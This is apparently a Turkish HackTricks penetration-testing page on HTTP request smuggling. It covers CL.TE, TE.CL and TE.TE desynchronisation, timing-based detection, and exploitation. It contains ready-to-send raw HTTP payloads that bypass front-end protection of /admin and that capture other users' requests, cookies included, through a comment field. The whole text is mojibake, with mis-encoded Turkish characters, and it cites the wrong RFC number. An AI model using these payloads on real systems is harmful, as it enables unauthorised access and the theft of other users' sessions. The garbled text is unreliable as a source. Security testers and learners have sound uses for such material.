# HTTP Ä°stek KaÃ§Ä±rma / HTTP Desenkronizasyon SaldÄ±rÄ±sÄ±

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hacklemeyi Ã¶ÄŸrenin!</summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n.
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nleri**]'ni edinin
* [**PEASS Ailesi**]'ni keÅŸfedin, Ã¶zel [**NFT'ler**]'imiz koleksiyonunu gÃ¶rÃ¼n
* **Discord grubuna** ğŸ’¬ [**katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**] katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@carlospolopm**]'i takip edin.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak** [**HackTricks**] ve [**HackTricks Cloud**] github depolarÄ±na PR gÃ¶nderin.

</details>

## Nedir

Bu zafiyet, **Ã¶n uÃ§ proxy'ler** ile **arka uÃ§** sunucu arasÄ±ndaki **desenkronizasyon** sayesinde bir **saldÄ±rganÄ±n**, Ã¶n uÃ§ proxy'ler (yÃ¼k dengeleyici/ters proxy) tarafÄ±ndan **tek bir istek** olarak **yorumlanacak** bir HTTP **istek** gÃ¶ndermesine olanak tanÄ±r ve **arka uÃ§** sunucu tarafÄ±ndan **2 istek** olarak **yorumlanÄ±r**.\
Bu, bir kullanÄ±cÄ±nÄ±n, **kendi sonrasÄ±nda gelen bir sonraki isteÄŸi deÄŸiÅŸtirmesine olanak tanÄ±r**.

### Teori

[**RFC Belirtimi (2161)**](https://tools.ietf.org/html/rfc2616)

> Bir mesaj, hem Bir AktarÄ±m KodlamasÄ± baÅŸlÄ±k alanÄ± hem de Bir Ä°Ã§erik UzunluÄŸu baÅŸlÄ±k alanÄ± ile alÄ±nÄ±rsa, ikincisi **ihmal edilmelidir**.

**Ä°Ã§erik UzunluÄŸu**

> Ä°Ã§erik UzunluÄŸu varlÄ±k baÅŸlÄ±ÄŸÄ±, alÄ±cÄ±ya gÃ¶nderilen varlÄ±k gÃ¶vdesinin **byte** cinsinden boyutunu belirtir.

**AktarÄ±m KodlamasÄ±: parÃ§alÄ±**

> AktarÄ±m KodlamasÄ± baÅŸlÄ±ÄŸÄ±, yÃ¼k gÃ¶vdesini gÃ¼venli bir ÅŸekilde kullanÄ±cÄ±ya aktarmak iÃ§in kullanÄ±lan kodlama biÃ§imini belirtir.\
> ParÃ§alÄ±, bÃ¼yÃ¼k verilerin parÃ§alar halinde gÃ¶nderildiÄŸi anlamÄ±na gelir.

### GerÃ§eklik

**Ã–n UÃ§** (yÃ¼k dengeleyici / Ters Proxy) _**iÃ§erik uzunluÄŸu**_ veya _**aktarÄ±m kodlamasÄ±**_ baÅŸlÄ±ÄŸÄ±nÄ± iÅŸlerken **Arka UÃ§** sunucu **diÄŸerini iÅŸler** ve bu da 2 sistem arasÄ±nda bir **desenkronizasyona** neden olur.\
Bu, **bir saldÄ±rganÄ±n**, yÃ¼k dengeleyiciye **tek bir istek** gÃ¶ndermesine olanak tanÄ±r ve bu istek, **arka uÃ§** sunucu tarafÄ±ndan **2 farklÄ± istek** olarak **yorumlanÄ±r**. Bu tekniÄŸin tehlikesi, **arka uÃ§** sunucunun, **enjekte edilen 2. isteÄŸi** sanki **bir sonraki istemciden geldiÄŸi gibi yorumlayacak olmasÄ± ve o istemcinin **gerÃ§ek isteÄŸinin** enjekte edilen isteÄŸin bir **parÃ§asÄ±** olmasÄ±dÄ±r.

### Ã–zellikler

HTTP'de **bir yeni satÄ±r karakterinin 2 bayttan oluÅŸtuÄŸunu** unutmayÄ±n:

* **Ä°Ã§erik UzunluÄŸu**: Bu baÅŸlÄ±k, isteÄŸin **gÃ¶vdesinin** **bayt** sayÄ±sÄ±nÄ± belirtmek iÃ§in **ondalÄ±k sayÄ±** kullanÄ±r. GÃ¶vde, son karakterde **bitmesi beklenir, isteÄŸin sonunda yeni bir satÄ±ra gerek yoktur**.
* **AktarÄ±m KodlamasÄ±:** Bu baÅŸlÄ±k, **bir sonraki parÃ§anÄ±n** **bayt** sayÄ±sÄ±nÄ± belirtmek iÃ§in **onaltÄ±lÄ± sayÄ±** kullanÄ±r. **ParÃ§a**, bir **yeni satÄ±r** ile **bitmelidir** ancak bu yeni satÄ±r **uzunluk gÃ¶stergesi tarafÄ±ndan sayÄ±lmaz**. Bu aktarÄ±m yÃ¶ntemi, **0 boyutunda bir parÃ§a ile biten 2 yeni satÄ±rÄ± takip etmelidir**: `0`
* **BaÄŸlantÄ±**: Deneyimime dayanarak, Ä°stek KaÃ§Ä±rma'nÄ±n ilk isteÄŸinde **`Connection: keep-alive`** kullanÄ±lmasÄ± Ã¶nerilir.

## Temel Ã–rnekler

{% hint style="success" %}
Bu saldÄ±rÄ±yÄ± Burp Suite ile **denemeye Ã§alÄ±ÅŸÄ±rken**, tekrarlayÄ±cÄ±da **`Ä°Ã§erik UzunluÄŸunu GÃ¼ncelle` ve `HTTP/1 satÄ±r sonlandÄ±rmalarÄ±nÄ± Normalize Et`** seÃ§eneklerini devre dÄ±ÅŸÄ± bÄ±rakÄ±n Ã§Ã¼nkÃ¼ bazÄ± cihazlar yeni satÄ±rlarÄ±, taÅŸÄ±ma dÃ¶nÃ¼ÅŸlerini ve hatalÄ± iÃ§erik uzunluklarÄ±nÄ± kÃ¶tÃ¼ye kullanÄ±r.
{% endhint %}

HTTP istek kaÃ§Ä±rma saldÄ±rÄ±larÄ±, Ã¶n uÃ§ ve arka uÃ§ sunucularÄ±n `Ä°Ã§erik UzunluÄŸu` (CL) ve `AktarÄ±m KodlamasÄ±` (TE) baÅŸlÄ±klarÄ±nÄ± nasÄ±l yorumladÄ±ÄŸÄ±ndaki farklÄ±lÄ±klardan yararlanan belirsiz istekler gÃ¶nderilerek oluÅŸturulur. Bu saldÄ±rÄ±lar, temel olarak **CL.TE**, **TE.CL** ve **TE.TE** olarak farklÄ± biÃ§imlerde ortaya Ã§Ä±kabilir. Her tÃ¼r, Ã¶n uÃ§ ve arka uÃ§ sunucularÄ±n bu baÅŸlÄ±klara Ã¶ncelik verme ÅŸeklinin benzersiz bir kombinasyonunu temsil eder. SunucularÄ±n aynÄ± isteÄŸi farklÄ± ÅŸekillerde iÅŸlemesinden kaynaklanan bu zafiyetler, beklenmeyen ve potansiyel olarak kÃ¶tÃ¼ amaÃ§lÄ± sonuÃ§lara yol aÃ§ar.

### Zafiyet TÃ¼rlerinin Temel Ã–rnekleri

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE Zafiyeti (Ã–n UÃ§ tarafÄ±ndan Ä°Ã§erik UzunluÄŸu kullanÄ±lÄ±rken, Arka UÃ§ tarafÄ±ndan AktarÄ±m KodlamasÄ± kullanÄ±lÄ±r)

* **Ã–n UÃ§ (CL):** Ä°steÄŸi `Ä°Ã§erik UzunluÄŸu` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
* **Arka UÃ§ (TE):** Ä°steÄŸi `AktarÄ±m KodlamasÄ±` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
* **SaldÄ±rÄ± Senaryosu:**
* SaldÄ±rgan, `Ä°Ã§erik UzunluÄŸu` baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸeri gerÃ§ek iÃ§erik uzunluÄŸuyla eÅŸleÅŸmeyen bir istek gÃ¶nderir.
* Ã–n uÃ§ sunucu, `Ä°Ã§erik UzunluÄŸu` deÄŸerine dayanarak tÃ¼m isteÄŸi arka uca iletir.
* Arka uÃ§ sunucu, `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ± nedeniyle isteÄŸi parÃ§alÄ± olarak iÅŸler ve kalan verileri ayrÄ±, sonraki bir istek olarak yorumlar.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Zafiyeti (Ã–n UÃ§ tarafÄ±ndan AktarÄ±m KodlamasÄ± kullanÄ±lÄ±rken, Arka UÃ§ tarafÄ±ndan Ä°Ã§erik UzunluÄŸu kullanÄ±lÄ±r)

* **Ã–n UÃ§ (TE):** Ä°steÄŸi `AktarÄ±m KodlamasÄ±` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
* **Arka UÃ§ (CL):** Ä°steÄŸi `Ä°Ã§erik UzunluÄŸu` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
* **SaldÄ±rÄ± Senaryosu:**
* SaldÄ±rgan, parÃ§alÄ± bir istek gÃ¶nderir, burada parÃ§a boyutu (`7b`) ve gerÃ§ek iÃ§erik uzunluÄŸÄ± (`Ä°Ã§erik UzunluÄŸu: 4`) uyuÅŸmaz.
* Ã–n uÃ§ sunucu, `AktarÄ±m KodlamasÄ±`'na saygÄ± gÃ¶stererek tÃ¼m isteÄŸi arka uca iletir.
* Arka uÃ§ sunucu, `Ä°Ã§erik UzunluÄŸu`'na saygÄ± gÃ¶stererek isteÄŸin yalnÄ±zca baÅŸlangÄ±Ã§ kÄ±smÄ±nÄ± (`7b` bayt) iÅŸler ve geri kalanÄ± istenmeyen bir sonraki isteÄŸin bir parÃ§asÄ± olarak bÄ±rakÄ±r.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: zafiyetli-web sitesi.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TE Zafiyeti (Her ikisi de tarafÄ±ndan kullanÄ±lan Transfer-Encoding ile obfuskasyon)

* **Sunucular:** Her ikisi de `Transfer-Encoding`'i destekler, ancak obfuskasyon aracÄ±lÄ±ÄŸÄ±yla biri bunu gÃ¶rmezden gelmeye kandÄ±rÄ±labilir.
* **SaldÄ±rÄ± Senaryosu:**
* SaldÄ±rgan, obfuskasyonlu `Transfer-Encoding` baÅŸlÄ±klarÄ±nÄ± iÃ§eren bir istek gÃ¶nderir.
* Hangi sunucunun (Ã¶n uÃ§ veya arka uÃ§) obfuskasyonu tanÄ±yamadÄ±ÄŸÄ±na baÄŸlÄ± olarak CL.TE veya TE.CL zafiyeti sÃ¶mÃ¼rÃ¼lebilir.
* Bir sunucu tarafÄ±ndan gÃ¶rÃ¼len iÅŸlenmemiÅŸ isteÄŸin bir sonraki isteÄŸin bir parÃ§asÄ± haline gelmesi, smuggling'e yol aÃ§ar.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Senaryosu (Her Ä°ki Ã–n UÃ§ ve Arka UÃ§ TarafÄ±ndan KullanÄ±lan Content-Length):**

* Her iki sunucu da isteÄŸi yalnÄ±zca `Content-Length` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
* Bu senaryo genellikle smuggling'e yol aÃ§maz, Ã§Ã¼nkÃ¼ her iki sunucunun isteÄŸin uzunluÄŸunu nasÄ±l yorumladÄ±ÄŸÄ± konusunda uyum vardÄ±r.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Ä°stek
```

#### **CL != 0 Senaryosu:**

* `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ±n var olduÄŸu ve sÄ±fÄ±r olmayan bir deÄŸere sahip olduÄŸu senaryolarÄ± ifade eder, bu da istek gÃ¶vdesinin iÃ§eriÄŸe sahip olduÄŸunu gÃ¶sterir.
* Smuggling saldÄ±rÄ±larÄ±nÄ± anlamak ve oluÅŸturmak iÃ§in Ã¶nemlidir, Ã§Ã¼nkÃ¼ sunucularÄ±n bir isteÄŸin sonunu nasÄ±l belirlediÄŸini etkiler.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

BoÅŸ Olmayan GÃ¶vde
```

#### Hop-by-hop baÅŸlÄ±klar aracÄ±lÄ±ÄŸÄ±yla zorlama

Hop-by-hop baÅŸlÄ±klarÄ± kÃ¶tÃ¼ye kullanarak proxy'e **Content-Length veya Transfer-Encoding baÅŸlÄ±ÄŸÄ±nÄ± silmesi iÃ§in iÅŸaret edebilir ve bÃ¶ylece bir HTTP isteÄŸi smuggling'i kÃ¶tÃ¼ye kullanÄ±labilir**.
```
Connection: Content-Length
```
## HTTP Ä°steÄŸi KaÃ§Ä±rma Bulma

HTTP isteÄŸi kaÃ§Ä±rma aÃ§Ä±klarÄ±nÄ± belirlemek genellikle sunucunun manipÃ¼le edilmiÅŸ isteklere yanÄ±t vermesi ne kadar sÃ¼rdÃ¼ÄŸÃ¼nÃ¼ gÃ¶zlemleyen zamanlama teknikleri kullanÄ±larak baÅŸarÄ±yla gerÃ§ekleÅŸtirilebilir. Bu teknikler Ã¶zellikle CL.TE ve TE.CL aÃ§Ä±klarÄ±nÄ± tespit etmek iÃ§in kullanÄ±ÅŸlÄ±dÄ±r. Bu yÃ¶ntemlerin yanÄ± sÄ±ra, bu tÃ¼r aÃ§Ä±klarÄ± bulmak iÃ§in kullanÄ±labilecek diÄŸer stratejiler ve araÃ§lar bulunmaktadÄ±r:

### Zamanlama Teknikleri Kullanarak CL.TE AÃ§Ä±klarÄ±nÄ± Bulma

* **YÃ¶ntem:**
* Uygulama aÃ§Ä±ksa, sunucunun ek verileri beklemesine neden olacak bir istek gÃ¶nderin.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **GÃ¶zlem:**
* Ã–n uÃ§ sunucusu isteÄŸi `Content-Length`'e gÃ¶re iÅŸler ve mesajÄ± erken keser.
* Bekleyen arka uÃ§ sunucusu, bir sonraki parÃ§ayÄ± beklerken gecikmeye neden olacak bir parÃ§a daha bekler.
* **Belirtiler:**
* YanÄ±tta zaman aÅŸÄ±mÄ± veya uzun gecikmeler.
* Arka uÃ§ sunucudan 400 Bad Request hatasÄ± almak, bazen detaylÄ± sunucu bilgileriyle birlikte.

### Zamanlama Teknikleri Kullanarak TE.CL AÃ§Ä±klarÄ±nÄ± Bulma

* **YÃ¶ntem:**
* Uygulama aÃ§Ä±ksa, sunucunun ek verileri beklemesine neden olacak bir istek gÃ¶nderin.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **GÃ¶zlem:**
* Ã–n uÃ§ sunucusu isteÄŸi `Transfer-Encoding`'e gÃ¶re iÅŸler ve tÃ¼m mesajÄ± iletilir.
* Bekleyen arka uÃ§ sunucusu, `Content-Length`'e dayalÄ± bir mesaj beklerken, gecikmeye neden olacak ek verileri bekler.

### DiÄŸer AÃ§Ä±klarÄ± Bulma YÃ¶ntemleri

* **FarklÄ± YanÄ±t Analizi:**
* Bir isteÄŸin hafif deÄŸiÅŸik versiyonlarÄ±nÄ± gÃ¶nderin ve sunucu yanÄ±tlarÄ±nÄ±n beklenmedik bir ÅŸekilde farklÄ±laÅŸÄ±p farklÄ±laÅŸmadÄ±ÄŸÄ±nÄ± gÃ¶zlemleyin, bu da bir ayrÄ±ÅŸtÄ±rma uyumsuzluÄŸunu gÃ¶sterebilir.
* **Otomatik AraÃ§lar Kullanma:**
* Burp Suite'in 'HTTP Request Smuggler' uzantÄ±sÄ± gibi araÃ§lar, belirsiz isteklerin Ã§eÅŸitli biÃ§imlerini gÃ¶ndererek ve yanÄ±tlarÄ± analiz ederek bu aÃ§Ä±klarÄ± otomatik olarak test edebilir.
* **Content-Length FarklÄ±lÄ±k Testleri:**
* GerÃ§ek iÃ§erik uzunluÄŸuyla uyumlu olmayan deÄŸiÅŸen `Content-Length` deÄŸerleri iÃ§eren istekler gÃ¶nderin ve sunucunun bu tÃ¼r uyumsuzluklarÄ± nasÄ±l iÅŸlediÄŸini gÃ¶zlemleyin.
* **Transfer-Encoding FarklÄ±lÄ±k Testleri:**
* BulanÄ±k veya hatalÄ± `Transfer-Encoding` baÅŸlÄ±klarÄ± iÃ§eren istekler gÃ¶nderin ve Ã¶n uÃ§ ve arka uÃ§ sunucularÄ±n bu manipÃ¼lasyonlara nasÄ±l farklÄ± yanÄ±t verdiÄŸini izleyin.

### HTTP Ä°steÄŸi KaÃ§Ä±rma AÃ§Ä±ÄŸÄ± Test Etme

Zamanlama tekniklerinin etkinliÄŸini doÄŸruladÄ±ktan sonra, istemci isteklerinin manipÃ¼le edilip edilemeyeceÄŸini doÄŸrulamak son derece Ã¶nemlidir. Basit bir yÃ¶ntem, Ã¶rneÄŸin, `/` iÃ§in bir isteÄŸin 404 yanÄ±tÄ± vermesini saÄŸlamaktÄ±r. [Temel Ã–rnekler](./#basic-examples) bÃ¶lÃ¼mÃ¼nde Ã¶nceki `CL.TE` ve `TE.CL` Ã¶rnekleri, istemcinin farklÄ± bir kaynaÄŸa eriÅŸmeyi amaÃ§lasa da 404 yanÄ±tÄ± almak iÃ§in istemci isteÄŸini nasÄ±l zehirleyeceÄŸinizi gÃ¶stermektedir.

**Ana DÃ¼ÅŸÃ¼nceler**

DiÄŸer isteklerle mÃ¼dahale ederek istek kaÃ§Ä±rma aÃ§Ä±klarÄ±nÄ± test ederken aklÄ±nÄ±zda bulundurmanÄ±z gerekenler:

* **FarklÄ± AÄŸ BaÄŸlantÄ±larÄ±:** "SaldÄ±rÄ±" ve "normal" istekler ayrÄ± aÄŸ baÄŸlantÄ±larÄ± Ã¼zerinden gÃ¶nderilmelidir. Her ikisi iÃ§in aynÄ± baÄŸlantÄ±yÄ± kullanmak, aÃ§Ä±ÄŸÄ±n varlÄ±ÄŸÄ±nÄ± doÄŸrulamaz.
* **TutarlÄ± URL ve Parametreler:** Her iki istek iÃ§in aynÄ± URL'leri ve parametre adlarÄ±nÄ± kullanmaya Ã§alÄ±ÅŸÄ±n. Modern uygulamalar genellikle URL ve parametrelere dayalÄ± olarak belirli arka uÃ§ sunucularÄ±na istek yÃ¶nlendirir. Bu eÅŸleÅŸmeleri kullanmak, her iki isteÄŸin de aynÄ± sunucu tarafÄ±ndan iÅŸlenme olasÄ±lÄ±ÄŸÄ±nÄ± artÄ±rÄ±r, baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in gereklidir.
* **Zamanlama ve YarÄ±ÅŸ KoÅŸullarÄ±:** "Normal" istek, "saldÄ±rÄ±" isteÄŸinden gelen mÃ¼dahaleyi tespit etmeyi amaÃ§lar ve diÄŸer eÅŸzamanlÄ± uygulama istekleriyle rekabet eder. Bu nedenle, "normal" isteÄŸi "saldÄ±rÄ±" isteÄŸinden hemen sonra gÃ¶nderin. YoÄŸun uygulamalar, kesin aÃ§Ä±k doÄŸrulamasÄ± iÃ§in birden fazla deneme gerektirebilir.
* **YÃ¼k Dengeleme ZorluklarÄ±:** YÃ¼k dengeleyici olarak hareket eden Ã¶n uÃ§ sunucular, istekleri Ã§eÅŸitli arka uÃ§ sistemlerine daÄŸÄ±tabilir. EÄŸer "saldÄ±rÄ±" ve "normal" istekler farklÄ± sistemlere dÃ¼ÅŸerse, saldÄ±rÄ± baÅŸarÄ±lÄ± olmaz. Bu yÃ¼k dengeleme yÃ¶nÃ¼, bir aÃ§Ä±ÄŸÄ± doÄŸrulamak iÃ§in birkaÃ§ deneme gerektirebilir.
* **Beklenmeyen KullanÄ±cÄ± Etkisi:** SaldÄ±rÄ±nÄ±zÄ±n yanlÄ±ÅŸlÄ±kla baÅŸka bir kullanÄ±cÄ±nÄ±n isteÄŸini etkilediÄŸini (tespit iÃ§in gÃ¶nderdiÄŸiniz "normal" istek olmayan) gÃ¶rmek, saldÄ±rÄ±nÄ±zÄ±n baÅŸka bir uygulama kullanÄ±cÄ±sÄ±nÄ± etkilediÄŸini gÃ¶sterir. SÃ¼rekli testler diÄŸer kullanÄ±cÄ±larÄ± etkileyebilir, bu nedenle dikkatli bir yaklaÅŸÄ±m gerektirebilir.

## HTTP Ä°steÄŸi KaÃ§Ä±rma KÃ¶tÃ¼ye Kullanma

### Ã–n UÃ§ GÃ¼venliÄŸini HTTP Ä°steÄŸi KaÃ§Ä±rma Yoluyla Atlatma

BazÄ± durumlarda, Ã¶n uÃ§ proxy'ler gelen istekleri inceleyerek gÃ¼venlik Ã¶nlemleri uygular. Ancak, bu Ã¶nlemler HTTP Ä°steÄŸi KaÃ§Ä±rma'yÄ± kullanarak atlatÄ±labilir, kÄ±sÄ±tlÄ± uÃ§ noktalara izinsiz eriÅŸim saÄŸlayarak Ã¶nemli bir gÃ¼venlik aÃ§Ä±ÄŸÄ± oluÅŸturabilir. Ã–rneÄŸin, `/admin`'e eriÅŸim dÄ±ÅŸarÄ±dan engellenmiÅŸ olabilir ve Ã¶n uÃ§ proxy bu tÃ¼r giriÅŸimleri aktif olarak engelleyebilir. Bununla birlikte, bu proxy, kaÃ§Ä±rÄ±lmÄ±ÅŸ bir HTTP isteÄŸi iÃ§inde gÃ¶mÃ¼lÃ¼ istekleri denetlemeyi ihmal edebilir, bÃ¶ylece bu kÄ±sÄ±tlamalarÄ± atlamak iÃ§in bir aÃ§Ä±k bÄ±rakabilir.

HTTP Ä°steÄŸi KaÃ§Ä±rma'nÄ±n Ã¶n uÃ§ gÃ¼venlik kontrollerini atlatmak iÃ§in nasÄ±l kullanÄ±labileceÄŸini gÃ¶steren aÅŸaÄŸÄ±daki Ã¶rnekleri dÃ¼ÅŸÃ¼nÃ¼n, Ã¶zellikle genellikle Ã¶n uÃ§ proxy tarafÄ±ndan korunan `/admin` yolunu hedef alan Ã¶rnekleri:

**CL.TE Ã–rneÄŸi**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
CL.TE saldÄ±rÄ±sÄ±nda, baÅŸlangÄ±Ã§ isteÄŸi iÃ§in `Content-Length` baÅŸlÄ±ÄŸÄ± kullanÄ±lÄ±rken, ardÄ±ÅŸÄ±k gÃ¶mÃ¼lÃ¼ istek `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ±nÄ± kullanÄ±r. Ã–n uÃ§ proxy'si baÅŸlangÄ±Ã§ `POST` isteÄŸini iÅŸler ancak gÃ¶mÃ¼lÃ¼ `GET /admin` isteÄŸini denetleyemez, bu da `/admin` yoluna izinsiz eriÅŸime izin verir.

**TE.CL Ã–rneÄŸi**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Benzer ÅŸekilde, TE.CL saldÄ±rÄ±sÄ±nda, ilk `POST` isteÄŸi `Transfer-Encoding: chunked` kullanÄ±r ve ardÄ±ÅŸÄ±k gÃ¶mÃ¼lÃ¼ istek, `Content-Length` baÅŸlÄ±ÄŸÄ±na dayalÄ± olarak iÅŸlenir. CL.TE saldÄ±rÄ±sÄ±na benzer ÅŸekilde, Ã¶n uÃ§ proxy, gizlice `/admin` yoluna eriÅŸim saÄŸlayarak, gizlenmiÅŸ `GET /admin` isteÄŸini gÃ¶z ardÄ± eder.

### Ã–n uÃ§ isteÄŸi yeniden yazma ortaya Ã§Ä±karma <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Uygulamalar genellikle gelen istekleri arka uÃ§ sunucuya iletmek Ã¶ncesinde deÄŸiÅŸtirmek iÃ§in bir **Ã¶n uÃ§ sunucusu** kullanÄ±r. Tipik bir deÄŸiÅŸiklik, `X-Forwarded-For: <Ä°stemcinin IP'si>` gibi baÅŸlÄ±klar eklemeyi iÃ§erir, bÃ¶ylece istemcinin IP'sinin arka uca iletilmesini saÄŸlar. Bu deÄŸiÅŸikliklerin anlaÅŸÄ±lmasÄ± Ã¶nemli olabilir, Ã§Ã¼nkÃ¼ bu, **korumalarÄ± atlamak** veya **gizli bilgileri veya uÃ§ noktalarÄ± ortaya Ã§Ä±karmak** iÃ§in yollarÄ± ortaya Ã§Ä±karabilir.

Bir proxy'nin bir isteÄŸi nasÄ±l deÄŸiÅŸtirdiÄŸini araÅŸtÄ±rmak iÃ§in, arka uÃ§ta yanÄ±tta yankÄ±lanan bir POST parametresi bulun. ArdÄ±ndan, bu parametreyi sona ekleyerek aÅŸaÄŸÄ±daki gibi benzer bir istek oluÅŸturun:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Bu yapÄ±da, ardÄ±ÅŸÄ±k istek bileÅŸenleri, yanÄ±tta yansÄ±tÄ±lan parametre olan `search=`'den sonra eklenir. Bu yansÄ±ma, ardÄ±ÅŸÄ±k isteÄŸin baÅŸlÄ±klarÄ±nÄ± ortaya Ã§Ä±karacaktÄ±r.

GÃ¶mÃ¼lÃ¼ isteÄŸin `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ± gerÃ§ek iÃ§erik uzunluÄŸuyla hizalamak Ã¶nemlidir. KÃ¼Ã§Ã¼k bir deÄŸerle baÅŸlayÄ±p kademeli olarak artÄ±rmak tavsiye edilir, Ã§Ã¼nkÃ¼ Ã§ok dÃ¼ÅŸÃ¼k bir deÄŸer yansÄ±tÄ±lan verileri kesebilirken, Ã§ok yÃ¼ksek bir deÄŸer isteÄŸin hata vermesine neden olabilir.

Bu teknik aynÄ± zamanda bir TE.CL zafiyeti baÄŸlamÄ±nda da uygulanabilir, ancak istek `search=\r\n0` ile sonlandÄ±rÄ±lmalÄ±dÄ±r. Yeni satÄ±r karakterlerinden baÄŸÄ±msÄ±z olarak, deÄŸerler arama parametresine eklenecektir.

Bu yÃ¶ntem, Ã¶ncelikle Ã¶n uÃ§ proxy tarafÄ±ndan yapÄ±lan istek deÄŸiÅŸikliklerini anlamak iÃ§in hizmet verir, esasen kendi kendine yÃ¶nlendirilen bir araÅŸtÄ±rma gerÃ§ekleÅŸtirir.

### DiÄŸer kullanÄ±cÄ±larÄ±n isteklerini yakalama <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Bir POST iÅŸlemi sÄ±rasÄ±nda bir parametrenin deÄŸeri olarak belirli bir isteÄŸi ekleyerek, bir sonraki kullanÄ±cÄ±nÄ±n isteklerini yakalamak mÃ¼mkÃ¼ndÃ¼r. Ä°ÅŸte bunun nasÄ±l baÅŸarÄ±lacaÄŸÄ±:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Bu senaryoda, **yorum parametresi**, genel eriÅŸime aÃ§Ä±k bir sayfadaki bir gÃ¶nderinin yorum bÃ¶lÃ¼mÃ¼ndeki iÃ§eriÄŸi depolamak amacÄ±yla kullanÄ±lmaktadÄ±r. Sonraki isteÄŸin iÃ§eriÄŸi bir yorum olarak gÃ¶rÃ¼necektir.

Ancak, bu teknik bazÄ± sÄ±nÄ±rlamalara sahiptir. Genellikle, sÄ±zdÄ±rÄ±lan istekte kullanÄ±lan parametre ayÄ±rÄ±cÄ±sÄ±na kadar yalnÄ±zca veri yakalanÄ±r. URL kodlu form gÃ¶nderimleri iÃ§in bu ayraÃ§ `&` karakteridir. Bu, kurban kullanÄ±cÄ±nÄ±n isteÄŸinden yakalanan iÃ§eriÄŸin ilk `&` karakterinde duracaÄŸÄ± anlamÄ±na gelir, hatta sorgu dizesinin bir parÃ§asÄ± olabilir.

AyrÄ±ca, bu yaklaÅŸÄ±mÄ±n TE.CL zafiyeti ile de mÃ¼mkÃ¼n olduÄŸunu belirtmek Ã¶nemlidir. Bu tÃ¼r durumlarda, istek `search=\r\n0` ile sonuÃ§lanmalÄ±dÄ±r. Yeni satÄ±r karakterlerinden baÄŸÄ±msÄ±z olarak, deÄŸerler arama parametresine eklenecektir.

